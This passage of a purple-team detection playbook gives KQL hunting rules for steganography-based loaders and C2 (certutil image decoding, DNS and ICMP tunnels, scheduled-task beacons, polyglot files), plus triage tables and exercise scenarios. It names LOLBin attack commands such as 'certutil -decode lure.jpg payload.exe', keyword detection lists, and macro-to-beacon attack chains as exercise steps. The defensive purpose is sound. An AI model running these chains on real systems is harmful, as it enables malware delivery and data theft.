DeviceProcessEvents
| where Timestamp >= ago(lookback)
| where FileName in~ (ScriptHosts)
| where InitiatingProcessFileName in~ (PdfParents)
| project
    ScriptTime = Timestamp, DeviceId, DeviceName, AccountName,
    ScriptFile = FileName, ScriptCmd = ProcessCommandLine,
    ParentApp = InitiatingProcessFileName, ScriptPid = ProcessId;

let PdfRead =
DeviceFileEvents
| where Timestamp >= ago(lookback)
| where ActionType in ("FileRead","FileCreated")
| where FolderPath has_any ("\\Downloads\\","\\Temp\\","\\AppData\\")
| where FileName endswith ".pdf"
| project PdfReadTime = Timestamp, DeviceId, InitiatingProcessId, PdfFile = FileName;

let NetEvents =
DeviceNetworkEvents
| where Timestamp >= ago(lookback)
| where RemotePort in (80,443,8080,8443)
| project NetTime = Timestamp, DeviceId, InitiatingProcessId, RemoteIP, RemoteUrl;

PdfSpawn
| join kind=inner (PdfRead) on DeviceId, $left.ScriptPid == $right.InitiatingProcessId
| where PdfReadTime between (ScriptTime .. ScriptTime + ChainWindow)
| join kind=inner (NetEvents) on DeviceId, $left.ScriptPid == $right.InitiatingProcessId
| where NetTime between (PdfReadTime .. PdfReadTime + ChainWindow)
| summarize
    FirstEvent = min(ScriptTime), LastEvent = max(NetTime),
    DeviceName = any(DeviceName), AccountName = any(AccountName),
    ParentApp = any(ParentApp), ScriptFile = any(ScriptFile),
    PdfFiles = make_set(PdfFile,5), RemoteUrls = make_set(RemoteUrl,5)
  by DeviceId, ScriptPid
| extend HunterDirective = "PDF reader spawned script that re-read a PDF and beaconed out. Possible PDF-as-stego-container chain. Extract embedded objects from PdfFiles (pdfextract / pdf-parser). Check for compressed streams or embedded images with anomalous entropy."
| project LastEvent, FirstEvent, DeviceName, AccountName, ParentApp, ScriptFile, PdfFiles, RemoteUrls, HunterDirective
| order by LastEvent desc
```

---

### 9c. Certutil Image Decode Abuse (LOLBAS Stego Variant)

**Red Team rationale:** `certutil -decode` is the simplest possible stego-adjacent loader. The "image" is actually a base64 text file with an image extension. Certutil strips the base64 wrapper and writes a native PE or script. No LSB, no pixel magic — the steganography is the file extension, not the encoding method. Common in commodity malware.

```kql
// ── Cousin Rule 9c: Certutil Image Decode ────────────────────────────────
// certutil used to decode or download a file with an image extension.
// Covers: certutil -decode, -urlcache, -split -f patterns.

DeviceProcessEvents
| where Timestamp >= ago(7d)
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any ("decode","urlcache","split")
| extend CommandLower = tolower(ProcessCommandLine)
| extend HasImageExtArg =
    CommandLower has ".png" or CommandLower has ".jpg" or
    CommandLower has ".jpeg" or CommandLower has ".bmp" or
    CommandLower has ".gif" or CommandLower has ".ico"
| where HasImageExtArg == true
| project
    Timestamp, DeviceName, AccountName,
    InitiatingParent = InitiatingProcessFileName,
    Command = ProcessCommandLine,
    ProcessId
| extend RiskLevel = case(
    InitiatingParent in~ ("powershell.exe","wscript.exe","cscript.exe","mshta.exe","cmd.exe"), "High",
    InitiatingParent in~ ("outlook.exe","winword.exe","excel.exe"), "Critical",
    "Medium"
)
| extend HunterDirective = "Certutil decoding or downloading a file with image extension. HIGH confidence LOLBAS stego-adjacent loader. Inspect the target file: if it is valid base64, decode and hash the output. Check for MZ header (PE) or PS1 content. Correlate downstream process execution within 2 minutes."
| order by Timestamp desc
```

---

### 9d. Zone.Identifier Absent on Executed/Read File

**Red Team rationale:** Files downloaded by a browser receive an NTFS alternate data stream (ADS) called `Zone.Identifier` with `ZoneId=3` (Internet). Files dropped by PowerShell, certutil, or bitsadmin using `.NET` WebClient or `Invoke-WebRequest` **do not** receive this ADS unless explicitly set. This is a reliable signal that a file arrived via a script, not a browser.

```kql
// ── Cousin Rule 9d: Zone.Identifier Absent on Image File ─────────────────
// Image file created in Downloads/Temp WITHOUT a matching Zone.Identifier creation.
// Indicates script-dropped image rather than browser download.

let lookback = 3d;
let ImageExt  = dynamic([".png",".jpg",".jpeg",".bmp",".gif",".ico"]);

let AllImageCreations =
DeviceFileEvents
| where Timestamp >= ago(lookback)
| where ActionType == "FileCreated"
| where FolderPath has_any ("\\Downloads\\","\\Temp\\","\\AppData\\Local\\Temp\\")
| extend FileExt = extract(@"\.[^\.]+$", 0, tolower(FileName))
| where FileExt in~ (ImageExt)
| project
    CreateTime = Timestamp, DeviceId, DeviceName, AccountName,
    ImageFile = FileName, ImagePath = FolderPath,
    CreatorPid = InitiatingProcessId, CreatorProc = InitiatingProcessFileName;

let ZoneIdCreations =
DeviceFileEvents
| where Timestamp >= ago(lookback)
| where ActionType == "FileCreated"
| where FileName endswith ":Zone.Identifier"
| project ZoneTime = Timestamp, DeviceId, ZoneFile = FileName;

AllImageCreations
| join kind=leftanti (
    ZoneIdCreations
    | extend BaseFile = replace_string(ZoneFile, ":Zone.Identifier", "")
) on DeviceId, $left.ImageFile == $right.BaseFile
// No matching Zone.Identifier → script-dropped
| where CreatorProc !in~ ("chrome.exe","msedge.exe","firefox.exe","iexplore.exe")
| extend RiskLevel = case(
    CreatorProc in~ ("powershell.exe","pwsh.exe","certutil.exe","bitsadmin.exe","wscript.exe"), "High",
    CreatorProc in~ ("outlook.exe","winword.exe"), "Critical",
    "Medium"
)
| extend HunterDirective = "Image file created without Zone.Identifier ADS — indicates script-based drop, not browser download. CreatorProc is the dropping process. Correlate against stego loader chain (Ghost Pixels ChainId if available). Run binwalk/zsteg on ImagePath."
| project CreateTime, DeviceName, AccountName, ImageFile, ImagePath, CreatorProc, CreatorPid, RiskLevel, HunterDirective
| order by CreateTime desc
```

---

### 9e. DNS Steganography — High-Entropy Subdomain C2

**Red Team rationale:** DNS stego uses base64 or hex-encoded data as subdomain labels. The resolver queries are logged but not content-inspected by most DNS tools. Indicators: extremely high query rate to a single domain, subdomain labels > 20 chars, high Shannon entropy in labels, NXDomain responses interspersed with valid responses (C2 fragmentation).

```kql
// ── Cousin Rule 9e: DNS Steganography / DNS Tunnel Beacon ────────────────
// High query rate to single domain with high-entropy subdomain labels.
// Requires DeviceDnsEvents or proxy DNS log ingestion.

let lookback = 1d;
let QueryRateThreshold = 50;     // queries to one domain in the window
let EntropyThreshold   = 3.5;    // Shannon entropy of subdomain label

DeviceDnsEvents
| where Timestamp >= ago(lookback)
| where isnotempty(DnsQueryName)
// Extract the registered domain (last two labels) and the subdomain
| extend Parts = split(DnsQueryName, ".")
| extend LabelCount = array_length(Parts)
| extend Subdomain = iff(LabelCount > 2,
    strcat_array(array_slice(Parts, 0, LabelCount - 2), "."), "")
| extend RegisteredDomain = iff(LabelCount >= 2,
    strcat(Parts[LabelCount-2], ".", Parts[LabelCount-1]), DnsQueryName)
// Approximate Shannon entropy of the subdomain portion
// (full entropy function requires helper — this approximates via length heuristic)
| extend SubLen = strlen(Subdomain)
| extend HighEntropySignal = iff(SubLen > 20 and Subdomain matches regex @"[A-Za-z0-9+/=]{20,}", true, false)
| where HighEntropySignal == true
| summarize
    QueryCount    = count(),
    UniqueSubdomains = dcount(Subdomain),
    SampleSubdomains = make_set(Subdomain, 5),
    FirstQuery    = min(Timestamp),
    LastQuery     = max(Timestamp),
    DeviceName    = any(DeviceName),
    AccountName   = any(AccountName)
  by DeviceId, RegisteredDomain
| where QueryCount >= QueryRateThreshold
| extend RiskLevel = case(
    QueryCount >= 200, "Critical",
    QueryCount >= 100, "High",
    "Medium"
)
| extend HunterDirective = "High-rate queries to a single domain with high-entropy subdomain labels. Likely DNS tunnelling or DNS-over-DNS stego C2. Submit RegisteredDomain to passive-DNS (SecurityTrails, Censys). Decode SampleSubdomains from base64/hex. Correlate with process initiating DNS queries — check for PowerShell DNS client API calls or dnsclient module usage."
| project LastQuery, FirstQuery, DeviceName, AccountName, RegisteredDomain, QueryCount, UniqueSubdomains, SampleSubdomains, RiskLevel, HunterDirective
| order by QueryCount desc
```

---

### 9f. ICMP Ping Tunnel C2

**Red Team rationale:** ICMP (ping) payloads are not content-inspected on most networks. Tools like `ptunnel`, `icmptunnel`, and custom Python scripts can encode a full bidirectional TCP stream inside ICMP echo request/reply packets. The signal: non-zero data in ICMP payload, abnormal packet size, or abnormal ICMP rate to a single host.

```kql
// ── Cousin Rule 9f: ICMP Tunnel C2 ───────────────────────────────────────
// Requires network telemetry with ICMP protocol visibility.
// Most EDR-sourced DeviceNetworkEvents filter ICMP — this is an NDR/firewall rule.
// Included for completeness; adapt to your network log schema.

// Placeholder for NDR/firewall schema — adapt Protocol field name accordingly:
// CommonSecurityLog or AzureFirewallLog variants shown below.

// For Defender for Endpoint environments:
DeviceNetworkEvents
| where Timestamp >= ago(7d)
| where Protocol == "Icmp" or Protocol == "ICMP"
| where RemotePort == 0   // ICMP has no port — some schemas expose this way
| summarize
    PingCount  = count(),
    UniqueIPs  = dcount(RemoteIP),
    RemoteIPs  = make_set(RemoteIP, 5),
    FirstPing  = min(Timestamp),
    LastPing   = max(Timestamp)
  by DeviceId, DeviceName, AccountName, InitiatingProcessFileName
| where PingCount > 100 and UniqueIPs == 1  // sustained rate to single host
| extend HunterDirective = "High-rate ICMP to single external IP. Potential ICMP tunnel C2. Capture PCAP on host and inspect payload bytes (should be zero or echo pattern for legitimate ping). Correlate InitiatingProcessFileName — ping.exe is normal, powershell.exe or python.exe is not."
| order by PingCount desc
```

---

### 9g. Scheduled Task / Registry Run Key Stego Beacon
*(covers Chain C — no UserFacingParent in tree)*

**Red Team rationale:** This is the most persistent and evasive form of the stego loader. No user interaction required after initial compromise. The task fires on schedule, silently fetches an image from an attacker-controlled CDN, extracts a command or payload from the image, executes it, and exits. No parent office process. The original rule misses this entirely.

```kql
// ── Cousin Rule 9g: Scheduled Task Stego Beacon ───────────────────────────
// PowerShell/script spawned by svchost (scheduled task) or taskeng
// that reads an image file and makes outbound HTTP/S connection.
// No UserFacingParent — covers post-persistence stego C2 polling.

let lookback    = 7d;
let ChainWindow = 10m;
let ImageExt    = dynamic([".png",".jpg",".jpeg",".bmp",".gif",".ico"]);

// Script hosts spawned by task scheduler parents
let TaskSpawnedScripts =
DeviceProcessEvents
| where Timestamp >= ago(lookback)
| where FileName in~ ("powershell.exe","pwsh.exe","wscript.exe",
                       "cscript.exe","cmd.exe","python.exe")
| where InitiatingProcessFileName in~ ("svchost.exe","taskeng.exe","taskschd.exe")
| project
    ScriptTime = Timestamp, DeviceId, DeviceName, AccountName,
    ScriptFile = FileName, ScriptCmd = ProcessCommandLine,
    ParentProc = InitiatingProcessFileName, ScriptPid = ProcessId;

let ImageReads =
DeviceFileEvents
| where Timestamp >= ago(lookback)
| where ActionType in ("FileRead","FileCreated","FileModified")
| extend FileExt = extract(@"\.[^\.]+$", 0, tolower(FileName))
| where FileExt in~ (ImageExt)
| project ImageReadTime = Timestamp, DeviceId, InitiatingProcessId, ImageFile = FileName, ImageFolder = FolderPath;

let NetActivity =
DeviceNetworkEvents
| where Timestamp >= ago(lookback)
| where RemotePort in (80,443,8080,8443)
| project NetTime = Timestamp, DeviceId, InitiatingProcessId, RemoteIP, RemoteUrl;

TaskSpawnedScripts
| join kind=inner (ImageReads) on DeviceId, $left.ScriptPid == $right.InitiatingProcessId
| where ImageReadTime between (ScriptTime .. ScriptTime + ChainWindow)
| join kind=inner (NetActivity) on DeviceId, $left.ScriptPid == $right.InitiatingProcessId
| where NetTime between (ScriptTime .. ScriptTime + ChainWindow)
| summarize
    FirstEvent    = min(ScriptTime), LastEvent = max(NetTime),
    DeviceName    = any(DeviceName), AccountName = any(AccountName),
    ScriptFile    = any(ScriptFile), ScriptCmd = any(ScriptCmd),
    ParentProc    = any(ParentProc),
    ImageFiles    = make_set(ImageFile, 5),
    RemoteUrls    = make_set(RemoteUrl, 5), RemoteIPs = make_set(RemoteIP, 5)
  by DeviceId, ScriptPid
| extend RiskLevel = "High"
| extend HunterDirective = "Scheduled task spawned script that read image file(s) and beaconed out. Classic post-persistence stego C2 polling. Enumerate all scheduled tasks on DeviceName (schtasks /query). Inspect ScriptCmd for image fetch + extraction pattern. Decode image files with binwalk/zsteg. Check RemoteUrls for cloud storage (S3, GitHub raw, Cloudflare)."
| project LastEvent, FirstEvent, DeviceName, AccountName, ParentProc, ScriptFile, ImageFiles, RemoteUrls, RemoteIPs, RiskLevel, HunterDirective, ScriptCmd
| order by LastEvent desc
```

---

### 9h. Image Downloaded Then Read by Same Script Session

**Red Team rationale:** The download and read are the same script in the same session but two sequential file events. This composite catches the case where the script itself fetches the image (creating it in Temp), then immediately reads it for extraction. The time delta between `FileCreated` and `FileRead` on the same file by the same PID should be seconds.

```kql
// ── Cousin Rule 9h: Image Self-Drop Then Read (same PID) ─────────────────
// Same process creates (downloads) and reads an image file within a tight window.
// High confidence that the script is both the downloader and extractor.

let lookback = 7d;
let ImageExt  = dynamic([".png",".jpg",".jpeg",".bmp",".gif"]);
let SelfDropWindow = 2m;

let ImageCreations =
DeviceFileEvents
| where Timestamp >= ago(lookback)
| where ActionType == "FileCreated"
| where FolderPath has_any ("\\Temp\\","\\AppData\\Local\\Temp\\","\\Downloads\\")
| extend FileExt = extract(@"\.[^\.]+$", 0, tolower(FileName))
| where FileExt in~ (ImageExt)
| project
    CreateTime = Timestamp, DeviceId, CreatorPid = InitiatingProcessId,
    CreatorProc = InitiatingProcessFileName, DropFile = FileName, DropPath = FolderPath;

let ImageReads =
DeviceFileEvents
| where Timestamp >= ago(lookback)
| where ActionType == "FileRead"
| extend FileExt = extract(@"\.[^\.]+$", 0, tolower(FileName))
| where FileExt in~ (ImageExt)
| project
    ReadTime = Timestamp, DeviceId, ReaderPid = InitiatingProcessId,
    ReaderProc = InitiatingProcessFileName, ReadFile = FileName;

ImageCreations
| join kind=inner (ImageReads) on
    DeviceId,
    $left.DropFile == $right.ReadFile,
    $left.CreatorPid == $right.ReaderPid
| where ReadTime between (CreateTime .. CreateTime + SelfDropWindow)
| where CreatorProc in~ ("powershell.exe","pwsh.exe","python.exe","wscript.exe","cmd.exe","cscript.exe")
| project
    CreateTime, ReadTime,
    DeviceId, CreatorProc,
    DropFile, DropPath,
    TimeDeltaSeconds = datetime_diff('second', ReadTime, CreateTime)
| extend RiskLevel = iff(CreatorProc in~ ("powershell.exe","pwsh.exe"), "High", "Medium")
| extend HunterDirective = "Script created then immediately read an image file — self-drop followed by extraction. Classic inline stego loader pattern. Inspect DropPath file. Correlate with Ghost Pixels v2 for full chain context."
| order by CreateTime desc
```

---

### 9i. Polyglot File Execution (Image-as-Executable)

**Red Team rationale:** A polyglot file is valid in two formats simultaneously. Common combinations: PNG+ZIP (valid PNG renders, ZIP opens with standard tools), JPEG+PE (valid JPEG previews, PE executes if renamed), GIF+HTML (valid GIF in browser, valid HTML when opened). Detection: file extension does not match the file's magic bytes, or execution of a file with image extension.

```kql
// ── Cousin Rule 9i: Polyglot Image Execution ─────────────────────────────
// A file with an image extension is executed as a script, PE, or archive.
// Covers regsvr32/rundll32 loading a .png/.jpg, or expand.exe extracting a .gif.

DeviceProcessEvents
| where Timestamp >= ago(7d)
| where ProcessCommandLine has_any (".png",".jpg",".jpeg",".bmp",".gif",".ico")
| where FileName in~ (
    "regsvr32.exe","rundll32.exe","expand.exe",
    "msiexec.exe","odbcconf.exe","mavinject.exe",
    "installutil.exe","cmstp.exe"
)
| project
    Timestamp, DeviceName, AccountName,
    LOLBin = FileName, CommandLine = ProcessCommandLine,
    InitiatingParent = InitiatingProcessFileName
| extend RiskLevel = case(
    InitiatingParent in~ ("outlook.exe","winword.exe","excel.exe"), "Critical",
    InitiatingParent in~ ("powershell.exe","wscript.exe","cmd.exe"), "High",
    "Medium"
)
| extend HunterDirective = "LOLBin loading or executing a file with image extension. Classic polyglot abuse. Extract the file at the path in CommandLine. Run 'file' magic byte check (is it actually PNG or is it PE/ZIP/DLL?). Check for Zone.Identifier. Correlate against stego loader chain."
| order by Timestamp desc
```

---

### 9j. Alpha Channel / Python PIL Stego Extraction

**Red Team rationale:** Python PIL/Pillow is not native to most corporate endpoints. When it appears, it is either part of an installed application (e.g., scientific tools, some dev environments) or it has been dropped by an attacker. A Python process calling `Image.open()` followed by pixel-level operations (`getpixel`, `getdata`) is almost certainly performing LSB extraction.

```kql
// ── Cousin Rule 9j: Python PIL Stego Extraction ───────────────────────────
// Python process with command line referencing PIL/Image operations on an
// image file in Downloads or Temp, followed by network activity.
// Primary signal: ScriptBlock or process command showing PIL usage.

let lookback = 7d;
let Window   = 5m;

let PythonImageOps =
DeviceProcessEvents
| where Timestamp >= ago(lookback)
| where FileName in~ ("python.exe","pythonw.exe","python3.exe")
| where ProcessCommandLine has_any (
    "PIL","Pillow","Image.open","getpixel","getdata",
    "fromstring","tobytes","frombytes","alpha_composite",
    "ImageChops","ImageFilter","steg"
)
| project
    ScriptTime = Timestamp, DeviceId, DeviceName, AccountName,
    ScriptCmd = ProcessCommandLine, ScriptPid = ProcessId,
    ParentProc = InitiatingProcessFileName;

let NetActivity =
DeviceNetworkEvents
| where Timestamp >= ago(lookback)
| where RemotePort in (80,443,8080,8443)
| project NetTime = Timestamp, DeviceId, InitiatingProcessId, RemoteIP, RemoteUrl;

PythonImageOps
| join kind=inner (NetActivity) on DeviceId, $left.ScriptPid == $right.InitiatingProcessId
| where NetTime between (ScriptTime .. ScriptTime + Window)
| summarize
    FirstEvent = min(ScriptTime), LastEvent = max(NetTime),
    DeviceName = any(DeviceName), AccountName = any(AccountName),
    ParentProc = any(ParentProc), ScriptCmd = any(ScriptCmd),
    RemoteUrls = make_set(RemoteUrl,5), RemoteIPs = make_set(RemoteIP,5)
  by DeviceId, ScriptPid
| extend RiskLevel = "High"
| extend HunterDirective = "Python PIL/pixel-level image operation followed by outbound network. Near-certain LSB extraction or alpha-channel stego. Check if python.exe was dropped (Zone.Identifier, hash) vs installed. Inspect ScriptCmd for hardcoded paths, base64, or IEX equivalent (exec/eval). Correlate RemoteUrls against passive-DNS."
| project LastEvent, FirstEvent, DeviceName, AccountName, ParentProc, ScriptCmd, RemoteUrls, RemoteIPs, RiskLevel, HunterDirective
| order by LastEvent desc
```

---

## 10. Scoring & Triage Reference

| Score | Level | Action |
|---|---|---|
| ≥ 11 | **Critical** | Immediate isolation. Memory dump. Notify IR. Full process tree, network and file lineage pivot. |
| 8–10 | **High** | Same-shift investigation. Validate lure, decode image, check C2 reputation. |
| 5–7 | **Medium** | Next-day hunt. Prevalence check across estate. Confirm script intent. |
| < 5 | **Low** | Batch hunt. Enrich and track. Use as hypothesis seed. |

### Scoring Modifiers Quick Reference

| Modifier | Points | Rationale |
|---|---|---|
| Office app as parent | +2 | Direct email/doc lure path |
| Browser as parent | +1 | Drive-by path |
| mshta / rundll32 / regsvr32 / certutil | +2 | High-risk LOLBin |
| Multiple outbound IPs or URLs | +1 | C2 redundancy or staging chain |
| Non-standard port (8080, 8443) | +1 | Evasive C2 configuration |
| Cloud CDN domain match | +1 | Known stego hosting pattern |
| Certutil decode/urlcache flag | +1 | Direct LOLBAS decode signal |
| IEX / Reflection in command | +2 | Near-certain execution of extracted payload |

---

## 11. Hunter Pivots & IOC Extraction Checklist

When a chain fires (any rule), work this checklist:

**Process tree**
- [ ] Pull full process tree from `RootScriptPid` — 5 levels up and down
- [ ] Check for injected processes (svchost, explorer, notepad with unusual PPIDs)
- [ ] Cross-reference `ScopedPids` against memory-resident artefacts (Volatility/EDR memory scan)

**Image file analysis**
- [ ] Run `binwalk` — identifies appended data, compression streams
- [ ] Run `zsteg` — detects LSB-encoded content in PNG/BMP
- [ ] Run `stegdetect` — statistical detection for multiple stego algorithms
- [ ] Check `Zone.Identifier` ADS — absent = script-dropped
- [ ] Compare file size vs expected size for image dimensions × bit depth (LSB inflation ~0, appended data = obvious)
- [ ] Check EXIF fields with `exiftool` — look for base64 blobs in comment/artist/description fields

**Network**
- [ ] WHOIS + passive-DNS on all `RemoteIPs` and `RemoteUrls`
- [ ] Check domain age (< 30 days = high risk)
- [ ] Check domain categorisation — if categorised as CDN/cloud, check hosting provider for abuse reports
- [ ] Pull full proxy/firewall logs for those IPs over the lookback window
- [ ] Check for HTTP POST requests carrying image content (exfil channel)

**Host**
- [ ] Enumerate scheduled tasks: `schtasks /query /fo LIST /v`
- [ ] Check registry run keys: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- [ ] Check WMI subscriptions
- [ ] Hash all files in `%TEMP%` and `%Downloads%` created during the chain window — submit to VirusTotal

**ScriptBlock / AMSI logs**
- [ ] Enable and review Event ID 4104 (ScriptBlock logging) if not already
- [ ] Grep for: `Invoke-Expression`, `IEX`, `::Load(`, `Reflection.Assembly`, `GetPixel`, `FromBase64String`, `Bitmap`, `System.Drawing`

---

## 12. Purple Team Exercise Scenarios

### Scenario 1 — Email Lure with Macro → Stego PNG (Detection: Ghost Pixels v2)

**Red Team task:**
1. Create a `.docm` with a macro that spawns PowerShell
2. PowerShell fetches a PNG (embed a base64 string in the PNG's EXIF comment field)
3. PowerShell reads the EXIF comment, decodes from base64, writes a beacon script to `%TEMP%`
4. Beacon makes HTTPS call to a controlled server
5. Clean up

**Blue Team expected triggers:**
- Ghost Pixels v2 (Chain: winword → powershell → PNG read → HTTPS)
- Cousin Rule 9d (no Zone.Identifier on PNG)
- Cousin Rule 9j if Python involved

**Purple Team questions:**
- At what point in the chain does the first alert fire?
- What is the gap between first activity and first alert?
- Can the analyst reconstruct the full chain from the ChainId alone?
- Does the EXIF payload survive the PNG being served from a CDN with image optimisation?

---

### Scenario 2 — Scheduled Task Polling C2 (Detection: Rule 9g)

**Red Team task:**
1. Create a scheduled task running every 4 hours
2. Task fires `powershell.exe` which GETs an image from an S3 bucket
3. Image has a 1-byte command embedded in the alpha channel (1 = beacon, 2 = collect, 3 = exit)
4. If command = 2, run a collection script and POST results embedded in a modified image

**Blue Team expected triggers:**
- Cousin Rule 9g (svchost → powershell → image read → HTTPS)
- Cousin Rule 9d if image is script-dropped

**Purple Team questions:**
- Does `svchost.exe` as parent reliably identify scheduled tasks in your EDR schema?
- Is the alpha channel modification detectable with zsteg?
- Does the POST of the modified image trigger any DLP or proxy alerts?

---

### Scenario 3 — Certutil LOLBAS Chain (Detection: Rule 9c)

**Red Team task:**
1. Drop a base64-encoded PE with a `.jpg` extension via spearphish
2. Macro runs: `certutil -decode lure.jpg payload.exe`
3. Execute `payload.exe`

**Blue Team expected triggers:**
- Cousin Rule 9c fires immediately on `certutil -decode *.jpg`
- Cousin Rule 9i if regsvr32 is used instead of direct execution

**Purple Team questions:**
- Does your EDR capture the full command line including input/output paths?
- Is the output PE immediately executed or staged for a second launcher?
- How quickly does the AV trigger on the decoded PE vs the original .jpg file?

---

*End of Ghost Pixels Purple Team Playbook v2026-05*  
*Ala Dabat | Detection Engineering & Threat Intelligence*
